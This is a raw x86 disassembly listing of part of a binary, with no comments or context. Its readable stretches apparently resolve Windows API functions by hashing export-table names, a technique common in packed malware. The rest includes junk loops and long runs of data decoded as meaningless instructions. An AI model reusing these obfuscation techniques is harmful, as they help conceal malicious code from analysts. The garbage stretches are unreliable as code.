  41a1cf:	jecxz  0x41a23f
  41a1d1:	mov    ds:0x9f3c45b7,eax
  41a1d6:	fdiv   DWORD PTR [ebx]
  41a1d8:	xchg   DWORD PTR [ebx-0x2843a381],eax
  41a1de:	cli    
  41a1df:	sbb    esi,DWORD PTR [edi-0x1556a6fa]
  41a1e5:	mov    BYTE PTR [ebx-0x13],bl
  41a1e8:	repnz mov ds:0x46ae8e3d,eax
  41a1ee:	call   0x80f9:0x81cbb678
  41a1f5:	push   ecx
  41a1f6:	add    al,BYTE PTR ds:0xd9f381d5
  41a1fc:	fldcw  WORD PTR [ebx+ebp*4+0x44]
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7d1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7d1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7d1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7d1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7d1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a86d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a78d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a779,0x42a86d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a250
  41a293:	ins    DWORD PTR es:[edi],dx
  41a294:	dec    esp
  41a295:	push   edx
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2e2
  41a29f:	jecxz  0x41a23c
  41a2a1:	loop   0x41a239
  41a2a3:	fadd   QWORD PTR [esi]
  41a2a5:	rcr    edi,0xb1
  41a2a8:	push   es
  41a2a9:	mov    BYTE PTR [esi],bh
  41a2ab:	push   cs
  41a2ac:	pop    edx
  41a2ad:	xchg   esp,eax
  41a2ae:	cmp    al,0xd7
  41a2b0:	rep ins BYTE PTR es:[edi],dx
  41a2b2:	add    DWORD PTR [eax+0x339ecb9],edx
  41a2b8:	mov    ah,0x7a
  41a2ba:	push   edx
  41a2bb:	sub    al,0x2
  41a2bd:	adc    DWORD PTR [esi-0x1f772fad],edx
  41a2c3:	push   esi
  41a2c4:	sbb    al,0xaf
  41a2c6:	scas   eax,DWORD PTR es:[edi]
  41a2c7:	lds    edi,FWORD PTR [esi]
  41a2c9:	add    al,0x75
  41a2cb:	stc    
  41a2cc:	ins    BYTE PTR es:[edi],dx
  41a2cd:	mov    DWORD PTR [edi],ecx
  41a2cf:	dec    eax
  41a2d0:	jge    0x41a324
  41a2d2:	push   es
  41a2d3:	outs   dx,BYTE PTR ds:[esi]
  41a2d4:	cmp    BYTE PTR [ecx-0x5b4d1bd7],bh
  41a2da:	dec    ecx
  41a2db:	cmp    ebx,edi
  41a2dd:	mov    ch,BYTE PTR [eax+0x11136dc1]
  41a2e3:	sbb    eax,0x7a398682
  41a2e8:	xor    eax,0x85b1ffe3
  41a2ed:	popf   
  41a2ee:	and    bh,ah
  41a2f0:	and    bl,dh
  41a2f2:	addr16 mov bh,0x30
  41a2f5:	(bad)  
  41a2f6:	fcomp  DWORD PTR [edx+eax*4+0x11977942]
  41a2fd:	nop
  41a2fe:	xor    DWORD PTR [edx],ebx
  41a300:	add    cl,ch
  41a302:	cmp    dh,bh
  41a304:	and    dl,BYTE PTR [edx]
  41a306:	push   cs
  41a307:	pop    ss
  41a308:	sbb    eax,0xfcb8c6aa
  41a30d:	scas   eax,DWORD PTR es:[edi]
  41a30e:	jmp    0x61fb:0x362bb317
  41a315:	push   esi
  41a316:	inc    ebx
  41a317:	nop
  41a318:	add    DWORD PTR [eax+0x5c01ce22],esp
  41a31e:	(bad)  
  41a31f:	inc    esi
  41a320:	test   BYTE PTR [ecx-0x42],bh
  41a323:	jmp    0x41a318
  41a325:	inc    ebx
  41a326:	mov    ebx,0xb92e1053
  41a32b:	rcr    DWORD PTR ds:0x18a788e8,cl
  41a331:	cmp    bl,dh
  41a333:	jb     0x41a2ca
  41a335:	push   ebx
  41a336:	sub    ecx,ebp
  41a338:	cmp    ch,BYTE PTR [eax-0x7]
  41a33b:	xor    BYTE PTR [ecx-0x4],al
  41a33e:	dec    edx
  41a33f:	or     dl,dl
  41a341:	push   ss
  41a342:	es cld 
  41a344:	and    BYTE PTR es:[ecx-0x33],0x78
  41a349:	inc    ebp
  41a34a:	arpl   cx,sp
  41a34c:	stos   BYTE PTR es:[edi],al
  41a34d:	pusha  
  41a34e:	and    eax,0x915493a6
  41a353:	lods   al,BYTE PTR ds:[esi]
  41a354:	imul   ebx,DWORD PTR [ecx-0x7a],0x54232714
  41a35b:	add    ebx,DWORD PTR [ecx]
  41a35d:	daa    
  41a35e:	retf   0x4dcb
  41a361:	test   BYTE PTR [eax+0x59],ah
  41a364:	cmp    al,0xa4
  41a366:	ins    BYTE PTR es:[edi],dx
  41a367:	pop    eax
  41a368:	push   eax
  41a369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a36a:	loopne 0x41a36f
  41a36c:	ss jmp 0x41a34c
  41a36f:	mov    esp,0x9fd15670
  41a374:	in     al,0x66
  41a376:	mov    al,0x6d
  41a378:	shl    DWORD PTR [esi+0x28d44d7d],0xa9
  41a37f:	mov    eax,ds:0xed4c73b1
  41a384:	cmp    DWORD PTR [edi],ebx
  41a386:	sub    bh,BYTE PTR [eax]
  41a388:	inc    ebx
  41a389:	in     eax,0xf7
  41a38b:	mov    al,ds:0xdfb73c2a
  41a390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a391:	cmp    BYTE PTR [edx-0x12],cl
  41a394:	adc    ecx,esp
  41a396:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a398:	scas   eax,DWORD PTR es:[edi]
  41a399:	es or  al,0x80
  41a39c:	adc    ecx,DWORD PTR [esi]
  41a39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39f:	iret   
  41a3a0:	dec    ecx
  41a3a1:	jbe    0x41a3bb
  41a3a3:	pop    ss
  41a3a4:	imul   esi,eax,0x2b
  41a3a7:	in     eax,0x8e
  41a3a9:	out    0x1f,eax
  41a3ab:	mov    BYTE PTR [edi-0x6c],cl
  41a3ae:	fist   DWORD PTR [eax-0x4d]
  41a3b1:	fstp   QWORD PTR [esi-0x48]
  41a3b4:	mov    ebp,0x320397e0
  41a3b9:	(bad)  
  41a3ba:	or     al,0x10
  41a3bc:	sub    esp,0x1e47dda
  41a3c2:	cmp    BYTE PTR [eax],0xee
  41a3c5:	push   ss
  41a3c6:	scas   eax,DWORD PTR es:[edi]
  41a3c7:	inc    edi
  41a3c8:	mov    ds:0x7fccf918,eax
  41a3cd:	or     bh,ch
  41a3cf:	xchg   ecx,eax
  41a3d0:	fcmovnb st,st(4)
  41a3d2:	loope  0x41a438
  41a3d4:	mov    WORD PTR [eax+edx*1+0x19],?
  41a3d8:	ficomp WORD PTR [ecx]
  41a3da:	adc    ecx,DWORD PTR [esi+0x7b2b3cb]
  41a3e0:	imul   BYTE PTR [esp+ebx*1]
  41a3e3:	xchg   ecx,eax
  41a3e4:	and    BYTE PTR [esi-0x5de99769],ah
  41a3ea:	jmp    0xb9e7721b
  41a3ef:	es aam 0xd2
  41a3f2:	cmp    cl,bl
  41a3f4:	sub    al,0xea
  41a3f6:	data16 loopne 0x41a3b2
  41a3f9:	aam    0xea
  41a3fb:	jle    0x41a3ad
  41a3fd:	pop    ebx
  41a3fe:	mov    bl,dl
  41a400:	xchg   edx,eax
  41a401:	cmp    eax,0x6576e3df
  41a406:	cs dec esp
  41a408:	push   0xe
  41a40a:	sar    BYTE PTR ds:0xa6f911e0,1
  41a410:	enter  0xd701,0x66
  41a414:	xor    al,0xba
  41a416:	arpl   WORD PTR [edi+0x21ae33a2],si
  41a41c:	mov    ds:0x10152128,eax
  41a421:	in     eax,dx
  41a422:	sub    eax,0x2ad1b4fd
  41a427:	outs   dx,DWORD PTR ds:[esi]
  41a428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a429:	xor    esi,DWORD PTR [ebp-0x74]
  41a42c:	lock es mov esi,0x8bd11791
  41a433:	ja     0x41a496
  41a435:	xlat   BYTE PTR ds:[ebx]
  41a436:	jnp    0x41a458
  41a438:	cs dec esi
  41a43a:	sbb    al,0x7e
  41a43c:	jg     0x41a3e8
  41a43e:	and    BYTE PTR [ebp+0x6e],bl
  41a441:	dec    esp
  41a442:	fiadd  WORD PTR [ebx+eiz*1]
  41a445:	retf   
  41a446:	clc    
  41a447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a448:	mov    DWORD PTR [ebx+0x3f],edx
  41a44b:	stos   DWORD PTR es:[edi],eax
  41a44c:	out    dx,eax
  41a44d:	or     BYTE PTR [ebx-0x19],0x7d
  41a451:	sti    
  41a452:	repnz or bl,BYTE PTR [ebx+0x76]
  41a456:	in     eax,dx
  41a457:	fsub   st,st(2)
  41a459:	push   0x45
  41a45b:	std    
  41a45c:	fidiv  DWORD PTR [edx-0x21]
  41a45f:	mov    ebx,0x131f3bb9
  41a464:	lock push cs
  41a466:	mov    ds:0x461883c6,eax
  41a46b:	fcom   QWORD PTR [ecx-0x13]
  41a46e:	mov    al,BYTE PTR [edx+edx*1+0x4badcd1b]
  41a475:	and    al,0x64
  41a477:	out    0x4f,al
  41a479:	pushf  
  41a47a:	xchg   ecx,eax
  41a47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a47c:	into   
  41a47d:	ins    DWORD PTR es:[edi],dx
  41a47e:	mov    edi,ebp
  41a480:	mov    bl,0xaf
  41a482:	aam    0x9d
  41a484:	xor    bh,BYTE PTR ds:0xfe60f125
  41a48a:	aas    
  41a48b:	bound  eax,QWORD PTR [esi]
  41a48d:	xor    DWORD PTR [edx-0x6f],ebp
  41a490:	mov    ds:0x5b2a3fac,al
  41a495:	leave  
  41a496:	push   edi
  41a497:	push   cs
  41a498:	fiadd  WORD PTR [edi]
  41a49a:	lods   eax,DWORD PTR ds:[esi]
  41a49b:	sub    al,0x6a
  41a49d:	jmp    FWORD PTR [ebx+0x14]
  41a4a0:	gs dec DWORD PTR gs:[ecx+0xc]
  41a4a5:	pusha  
  41a4a6:	fwait
  41a4a7:	cwde   
  41a4a8:	and    esi,0xffffffad
  41a4ab:	sub    al,0x4d
  41a4ad:	fdiv   st,st(6)
  41a4b0:	mov    BYTE PTR ds:0xd9e9be31,dh
  41a4b6:	mov    DWORD PTR [ebp-0x14],eax
  41a4b9:	mov    DWORD PTR ds:0x42a77d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a77d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a77d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a77d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a811,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a811
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a811,eax
  41a512:	cmp    DWORD PTR ds:0x42a811,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a811,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a811,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a811
  41a551:	inc    eax
  41a552:	mov    ds:0x42a811,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a79d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a79d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a79d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a79d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a79d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a779,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a779
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a779,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a779,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a779,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a779
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a779,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a779,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	adc    BYTE PTR [edi-0x284f2800],ch
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a696
  41a69b:	mov    cl,0xd9
  41a69d:	push   ds
  41a69e:	divps  xmm3,XMMWORD PTR [eax+0x752c2e4b]
  41a6a5:	sahf   
  41a6a6:	add    dl,bh
  41a6a8:	jecxz  0x41a69d
  41a6aa:	pop    ss
  41a6ab:	ret    0xf239
  41a6ae:	iret   
  41a6af:	in     al,0xbb
  41a6b1:	mov    dh,0x14
  41a6b3:	je     0x41a64d
  41a6b5:	call   0x98fbe549
  41a6ba:	gs jbe 0x41a6a4
  41a6bd:	mov    al,BYTE PTR [ebx+0x5b]
  41a6c0:	icebp  
  41a6c1:	popf   
  41a6c2:	pop    eax
  41a6c3:	ds inc esp
  41a6c5:	pop    ds
  41a6c6:	arpl   WORD PTR [edx+0x24],bx
  41a6c9:	cmp    ah,BYTE PTR [edx+0x79]
  41a6cc:	cli    
  41a6cd:	mov    bh,0xb5
  41a6cf:	(bad)  [esi]
  41a6d1:	or     esp,DWORD PTR [edi+0x2e950753]
  41a6d7:	and    BYTE PTR [ebp-0x14],ch
  41a6da:	lds    ebp,FWORD PTR [ebx]
  41a6dc:	enter  0x400e,0x4f
  41a6e0:	and    al,0xcf
  41a6e2:	push   cs
  41a6e3:	ins    DWORD PTR es:[edi],dx
  41a6e4:	js     0x41a68d
  41a6e6:	les    esp,FWORD PTR [ecx-0x5010980]
  41a6ec:	and    eax,0xb11d5814
  41a6f1:	stos   BYTE PTR es:[edi],al
  41a6f2:	add    cl,ah
  41a6f4:	scas   al,BYTE PTR es:[edi]
  41a6f5:	adc    al,dh
  41a6f7:	adc    DWORD PTR [ebp-0x6b1ab990],0x1b
  41a6fe:	jg     0x41a778
  41a700:	data16 aad 0xd
  41a703:	sbb    al,0x27
  41a705:	iret   
  41a706:	push   edi
  41a707:	mov    edx,0x639f855e
  41a70c:	push   edi
  41a70d:	out    dx,al
  41a70e:	daa    
  41a70f:	pop    es
  41a710:	jecxz  0x41a6fa
  41a712:	push   cs
  41a713:	mov    ah,al
  41a715:	mov    ecx,0x28086a95
  41a71a:	mov    ds:0x67a182a1,al
  41a71f:	and    esi,DWORD PTR [ebp-0x33]
  41a722:	fdiv   st,st(4)
  41a724:	sahf   
  41a725:	dec    ebx
  41a726:	jb     0x41a73e
  41a728:	adc    eax,0xd7ce25d
  41a72d:	jne    0x41a6b3
  41a72f:	ffree  st(1)
  41a731:	stos   BYTE PTR es:[edi],al
  41a732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a733:	xchg   ebp,eax
  41a734:	sbb    edi,DWORD PTR ds:0x1a61a612
  41a73a:	cdq    
  41a73b:	mov    edx,0xbd826bc7
  41a740:	rcr    DWORD PTR [ebp-0x3e],cl
  41a743:	or     eax,0x7f8c9865
  41a748:	outs   dx,DWORD PTR ds:[esi]
  41a749:	ret    0x38c
  41a74c:	mov    cl,ch
  41a74e:	shr    BYTE PTR [ebp-0x57],0x13
  41a752:	sub    BYTE PTR [esi-0x2a235113],0x7d
  41a759:	mov    eax,ds:0x67a8b9e8
  41a75e:	data16 sahf 
  41a760:	(bad)  
  41a761:	cmp    eax,0xaa7382b
  41a766:	outs   dx,BYTE PTR ds:[esi]
  41a767:	sub    dl,bl
  41a769:	sbb    bl,BYTE PTR [ecx-0x59]
  41a76c:	inc    edi
  41a76d:	dec    ebx
  41a76e:	lock dec DWORD PTR [edi]
  41a771:	cli    
  41a772:	push   ebx
  41a773:	je     0x41a7b9
  41a775:	cs (bad) 
  41a777:	in     al,dx
  41a778:	push   0xfffffff5
  41a77a:	es inc edi
  41a77c:	pusha  
  41a77d:	das    
  41a77e:	sar    cl,cl
  41a780:	xchg   esi,eax
  41a781:	cmp    eax,0x96954e8f
  41a786:	xchg   BYTE PTR [edi-0x39733ac9],dl
  41a78c:	fidiv  DWORD PTR [esp+esi*2]
  41a78f:	mov    ds:0xc13708d2,al
  41a794:	popa   
  41a795:	mov    bh,BYTE PTR [edi]
  41a797:	push   ds
  41a798:	xchg   DWORD PTR ds:0xd5684ad9,ebp
  41a79e:	sub    eax,esi
  41a7a0:	leave  
  41a7a1:	ret    0xe7c
  41a7a4:	imul   esi,DWORD PTR [edi],0xffffffff
  41a7a7:	stos   DWORD PTR es:[edi],eax
  41a7a8:	pushf  
  41a7a9:	push   ebx
  41a7aa:	je     0x41a7c8
  41a7ac:	inc    ecx
  41a7ad:	cmc    
  41a7ae:	jns    0x41a748
  41a7b0:	mov    ebx,0x49d8f03e
  41a7b5:	jns    0x41a77d
  41a7b7:	add    eax,0xbff00dc4
  41a7bc:	test   eax,0x3fd8167f
  41a7c1:	stc    
  41a7c2:	rcl    BYTE PTR [esp+eiz*4],cl
  41a7c5:	mov    ah,0x5d
  41a7c7:	sti    
  41a7c8:	leave  
  41a7c9:	imul   esp,ecx,0x2cbf526e
  41a7cf:	adc    cl,BYTE PTR ds:0x44e110d1
  41a7d5:	jl     0x41a852
  41a7d7:	adc    eax,0x162aa2e5
  41a7dc:	shl    BYTE PTR [eax],0xf8
  41a7df:	push   cs
  41a7e0:	ret    0x6567
  41a7e3:	aad    0x4a
  41a7e5:	bound  eax,QWORD PTR [ebx]
  41a7e7:	scas   al,BYTE PTR es:[edi]
  41a7e8:	sbb    edx,esi
  41a7ea:	sete   BYTE PTR [ebp+edx*4+0x4958a3f2]
  41a7f2:	gs aaa 
  41a7f4:	imul   ebp,esi,0xffffffb2
  41a7f7:	xchg   esi,eax
  41a7f8:	shr    BYTE PTR [ecx-0x11d4f812],1
  41a7fe:	mov    dh,0x8c
  41a800:	inc    ebx
  41a801:	xchg   ebp,eax
  41a802:	outs   dx,BYTE PTR ds:[esi]
  41a803:	daa    
  41a804:	out    0xd8,al
  41a806:	xchg   esp,eax
  41a807:	jb     0x41a80d
  41a809:	cmp    BYTE PTR [edi],0xbf
  41a80c:	sub    eax,0x23a1ec09
  41a811:	enter  0xaded,0x13
  41a815:	call   esi
  41a817:	pop    edx
  41a818:	jb     0x41a83d
  41a81a:	inc    ebx
  41a81b:	xor    BYTE PTR [edi],ah
  41a81d:	sti    
  41a81e:	push   edx
  41a81f:	add    DWORD PTR [esi],esp
  41a821:	mov    ch,0xcf
  41a823:	mov    cl,0x8
  41a825:	ins    DWORD PTR es:[edi],dx
  41a826:	jae    0x41a89d
  41a828:	mov    dl,0x27
  41a82a:	cld    
  41a82b:	ficomp DWORD PTR [edi-0x3e9bc46f]
  41a831:	pop    es
  41a832:	push   ebp
  41a833:	pop    eax
  41a834:	fnstenv [ebp-0x27]
  41a837:	fild   DWORD PTR [ebp-0x563af534]
  41a83d:	add    eax,0xd97d0049
  41a842:	test   eax,0x1951fd22
  41a847:	mov    DWORD PTR [edx+0x29e16ec],edx
  41a84d:	dec    edi
  41a84e:	retf   
  41a84f:	cli    
  41a850:	aad    0xa2
  41a852:	adc    al,0xc3
  41a854:	mov    al,0xce
  41a856:	mov    ds:0xde211433,al
  41a85b:	sbb    cl,dl
  41a85d:	ficom  DWORD PTR [ebx]
  41a85f:	jmp    DWORD PTR [si-0x7]
  41a863:	dec    eax
  41a864:	add    BYTE PTR [edx],bh
  41a866:	inc    esi
  41a867:	inc    edx
  41a868:	or     BYTE PTR [edi+0x21],ch
  41a86b:	repnz add BYTE PTR [edx+0x0],ch
  41a86f:	push   esp
  41a870:	add    DWORD PTR [eax-0x72c2c132],eax
  41a876:	in     eax,dx
  41a877:	add    DWORD PTR [ebx],ecx
  41a879:	push   edx
  41a87a:	add    BYTE PTR [ebx],ch
  41a87c:	adc    eax,0x958d8277
  41a881:	dec    ebx
  41a882:	pushf  
  41a883:	jp     0x41a84a
  41a885:	push   esi
  41a886:	enter  0xac79,0xea
  41a88a:	scas   eax,DWORD PTR es:[edi]
  41a88b:	imul   ecx,DWORD PTR cs:0x54cd53cc,0x1f7037fb
  41a896:	fs xchg ecx,eax
  41a898:	pop    eax
  41a899:	mov    ebp,DWORD PTR [ebx]
  41a89b:	push   ss
  41a89c:	lock pushf 
  41a89e:	and    ah,0x54
  41a8a1:	adc    edi,DWORD PTR [ecx+edx*4-0x11d5f9b0]
  41a8a8:	sub    al,0x94
  41a8aa:	mov    al,0x55
  41a8ac:	jmp    0x41a836
  41a8ae:	icebp  
  41a8af:	in     eax,0x22
  41a8b1:	inc    edx
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	adc    DWORD PTR [ebx-0x25],0xffffff89
  41a918:	xor    BYTE PTR [eax-0x2b],cl
  41a91b:	jg     0x41a995
  41a91d:	adc    BYTE PTR [esi+0x78],bh
  41a920:	js     0x41a8ee
  41a922:	sbb    BYTE PTR [ebp+ebx*4-0x3e65e830],dl
  41a929:	mov    ecx,0x727a191e
  41a92e:	mov    eax,0x42461d86
  41a933:	fwait
  41a934:	scas   al,BYTE PTR es:[edi]
  41a935:	inc    ecx
  41a936:	xchg   ebx,eax
  41a937:	or     al,0xc1
  41a939:	mov    ch,0x6d
  41a93b:	pop    esi
  41a93c:	pop    ds
  41a93d:	jge    0x41a8f3
  41a93f:	clc    
  41a940:	mov    ch,0xc
  41a942:	and    BYTE PTR [edx],0xf0
  41a945:	adc    al,0xe6
  41a947:	stos   BYTE PTR es:[edi],al
  41a948:	pop    ebp
  41a949:	and    al,ah
  41a94b:	xor    BYTE PTR [edi],ah
  41a94d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a94e:	push   edi
  41a94f:	cmp    BYTE PTR [esi-0x51c05eb4],0xc9
  41a956:	and    bl,ch
  41a958:	popf   
  41a959:	add    cl,BYTE PTR [eax+0x78279b2e]
  41a95f:	loop   0x41a972
  41a961:	retf   
  41a962:	push   edx
  41a963:	add    al,0x3d
  41a965:	cmc    
  41a966:	fnstenv [edx]
  41a968:	add    BYTE PTR [edx+0x22],bh
  41a96b:	sbb    eax,0x18e6c942
  41a970:	fcomp  DWORD PTR [eax]
  41a972:	dec    esi
  41a973:	xor    BYTE PTR [esi],al
  41a975:	iret   
  41a976:	dec    BYTE PTR [ebx]
  41a978:	pop    ss
  41a979:	pop    edx
  41a97a:	dec    bx
  41a97c:	xor    eax,0xa6b5ace6
  41a981:	sub    BYTE PTR [ecx+ebp*4-0x52],bh
  41a985:	mov    cl,0xfd
  41a987:	retf   
  41a988:	cmp    BYTE PTR [ecx],bh
  41a98a:	add    al,0x75
  41a98c:	popa   
  41a98d:	jecxz  0x41a9b6
  41a98f:	out    dx,eax
  41a990:	mov    dh,0xaf
  41a992:	mov    BYTE PTR [ecx-0x23],bh
  41a995:	jmp    FWORD PTR [ebp+0x22]
  41a998:	jp     0x41a9cb
  41a99a:	ds xchg bh,dh
  41a99d:	adc    ecx,DWORD PTR [ecx-0x34]
  41a9a0:	push   ebx
  41a9a1:	pushf  
  41a9a2:	(bad)  
  41a9a3:	dec    esi
  41a9a4:	push   ebx
  41a9a5:	fsubr  QWORD PTR [ebx+0x40]
  41a9a8:	cmp    ah,BYTE PTR [esi-0x2a088fee]
  41a9ae:	clc    
  41a9af:	repnz push 0xb6546dac
  41a9b5:	mov    ebx,0x816866e
  41a9ba:	or     BYTE PTR [edi-0x5662b2db],cl
  41a9c0:	lock repnz and al,0xec
  41a9c4:	stos   DWORD PTR es:[edi],eax
  41a9c5:	or     ch,BYTE PTR [edx+esi*1+0x32]
  41a9c9:	push   0xffffff97
  41a9cb:	sbb    eax,0xd696be28
  41a9d0:	push   ecx
  41a9d1:	adc    al,0x87
  41a9d3:	xlat   BYTE PTR ds:[ebx]
  41a9d4:	and    edi,0xffffffca
  41a9d7:	and    DWORD PTR [esi-0x24da9e73],edi
  41a9dd:	push   esi
  41a9de:	cmp    DWORD PTR [ebx+0x173e1a0b],esp
  41a9e4:	adc    bh,BYTE PTR [esi+0x5c8e116a]
  41a9ea:	sub    DWORD PTR [ecx+0x66],0xa433cc8
  41a9f1:	mov    al,fs:0xc4a7ea4f
  41a9f7:	pop    esi
  41a9f8:	hlt    
